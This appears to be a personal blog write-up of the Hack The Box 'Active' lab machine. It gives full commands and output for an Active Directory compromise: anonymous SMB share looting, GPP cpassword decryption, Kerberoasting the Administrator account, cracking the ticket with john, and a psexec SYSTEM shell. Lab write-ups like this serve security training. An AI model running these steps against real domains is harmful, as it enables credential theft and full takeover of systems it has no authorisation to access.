---
title: "[HTB] Active"
permalink: /writeups/htb/active/
excerpt: "Quick write-up for the Active machine from Hack The Box."
tags:
  - hackthebox
  - activedirectory
  - pentest
  - writeup
---

---

{% include toc icon="cog" title="Active Solution" %}

The [Active](https://app.hackthebox.com/machines/Active) machine has been created by [eks](https://app.hackthebox.com/users/302) and [mrb3n](https://app.hackthebox.com/users/2984). This is an **easy** Windows Machine with a strong focus on Active Directory exploitation.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_black.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_active_infocard.png){: .align-center}

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).
{: .notice--info}

# Recon/Enumeration

Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.

Here, we don't have any credentials or hints about how to approach this machine, it's fairly common on HTB boxes. The first step would be reconnaissance, to check what we can see with the info we have, meaning, an IP address.

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the TCP ports open on the machine.

```bash
$ nmap -sV -Pn 10.129.170.69 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-06 15:06 EST
Nmap scan report for 10.129.170.69
Host is up (0.030s latency).
Not shown: 981 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-06 20:06:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49175/tcp open  msrpc         Microsoft Windows RPC
49176/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.22 seconds
```

```bash
$ smbclient -N -L \\\\10.129.170.69
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

```bash
$ smbclient \\\\10.129.170.69\\Replication
Enter WORKGROUP\ax's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> prompt off
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (1.5 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (29.9 KiloBytes/sec) (average 8.4 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.1 KiloBytes/sec) (average 4.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (13.6 KiloBytes/sec) (average 5.1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (45.4 KiloBytes/sec) (average 8.5 KiloBytes/sec)
smb: \> 
```

```bash
cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

SVC_TGS:GPPstillStandingStrong2k18

```bash
$ crackmapexec smb 10.129.170.69 -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb
SMB         10.129.170.69   445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.170.69   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
```

$ smbclient //10.129.170.69/Users -U SVC_TGS
Enter WORKGROUP\SVC_TGS's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 277504 blocks available

smb: \> dir SVC_TGS\Desktop\
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Sun Feb  6 15:04:32 2022

                5217023 blocks of size 4096. 277488 blocks available
smb: \> 


```bash
$ bloodhound-python -c All -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb -ns 10.129.170.69 --zip
INFO: Found AD domain: active.htb
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 4 users
INFO: Found 40 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
INFO: Done in 00M 04S
INFO: Compressing output into 20220206151645_bloodhound.zip
```


![image-center](/images/htb/htb_active_bloodhound_00.png){: .align-center}



https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
```bash
$ impacket-GetUserSPNs active.htb/SVC_TGS -dc-ip 10.129.170.69 -request                                                                                                   1 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-02-06 15:04:39.798518             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$9a57cd37f03ac00064a1af4c5187f4e7$c92fce358c841b443bf6ce9ea2f32bab6d52fb3b2c66b7cc3b0ae223c82906f30660de1180f563c9b682f2bfc847a10e0bb0245c2e49ea2bc2a2d2b8d46e053dfdd4af82a19343c662d45aa27a90eec0ed107bd04ed062cff3572d601abeb3b711f517a4281f1a582885bf03095f317d0819f581b5c0926bba02d0e7cc1d5be24391d2a80067e3f092c7432e88464ddb772edb23aa72c6599882f0087bde701ff493abdc758c04bc9276ced184075159af078f310bfc99e8d9a779ee5c45633164e148e7bec62bdbd2ae5b545054768513141233b9d9e055853ea6773c8435c3721855fc0b91be951f18cee3bf8e52d6a2a2e74e53b0308b5962e7c06f4d1299251307925c2e958f1f57eb76ae99311a03ef3671b79a25d87716e51b53785a4729db0cb84c3f517996c0779149807ec7330c7ba42cded12d3f0abc98a3387680912a5df5c77df03fa79dad69754e2060ca01343f6f95c9621c34d45a89b604ca287b7c5c7f28aa7336e161429c081c5bc4439626acca965a81e6d1896fe48fe4ec752e1e60269b0644b9d0808e23f9380c7ae73ec73cdac23c97ceb7ee81e364bf167c8a60e3c8128ac629f45b34503f817721a6939d0ec92cce5b5fe1af1cb182e66767f424caa3fbff05d9a2aa38e26aa41c456c4d557048cc7865f235867a24726f55348d7a0ec3797f5960df4335f2f0950885921bfa9896ee661cc2d9f0860f8d7df103ecf20358baf56579af35f89bdb31fb770957df054f182c47517b6f8c53c22072bac962163a81055d6f57afb586b2d15e6502910556de5973469204bc75c6739eb86dab36c4468ab74675df07b2c240512f8e596fe795713bc158ca901c8ab1e9151a054a7e54364c9695435b0cdeac5a74e1fc82a7625861b92d270da61963af0a36a6ebbba55ede5670aa3fbe6243b80453eb60d6614eb37d9992aa6f59ec83e8c6a4a14c097f7ed56d7b44e9fffa388e3e00a75baa35ad13ebff43c5b351f98eb986911487477ab92d12e5b2eac81fde98fe6a81974bafda3fa5a3e14340e9c52ff39cf1052b5efd95595baad288edfad4b8128177f64862cb06126705d700c840397a529ec8ebad753c04ef5db2116930f19ac99c50019544a084192b166b98b05ee253c72e238e5b7829a127caf6c487c6223e8642848526e80113fbbbf7ba4ada7a6ce1285d4a4bb9d854917cf44cd05fd408eb47fd05b88a4e0c183e0339e831520630aad4569986c775f365f7b4e801f2
```

```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:10 DONE (2022-02-07 07:10) 0.09784g/s 1031Kp/s 1031Kc/s 1031KC/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

$ crackmapexec smb 10.129.170.69 -d active.htb -u Administrator -p Ticketmaster1968  
SMB         10.129.170.69   445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.170.69   445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)


$ impacket-psexec active.htb/administrator@10.129.170.69
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.170.69.....
[*] Found writable share ADMIN$
[*] Uploading file LbvMUDRA.exe
[*] Opening SVCManager on 10.129.170.69.....
[*] Creating service KvqU on 10.129.170.69.....
[*] Starting service KvqU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> dir C:\Users\Administrator\Desktop\root.txt
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

06/02/2022  10:04                   34 root.txt

               1 File(s)             34 bytes
               0 Dir(s)   1.136.885.760 bytes free

C:\Windows\system32> 

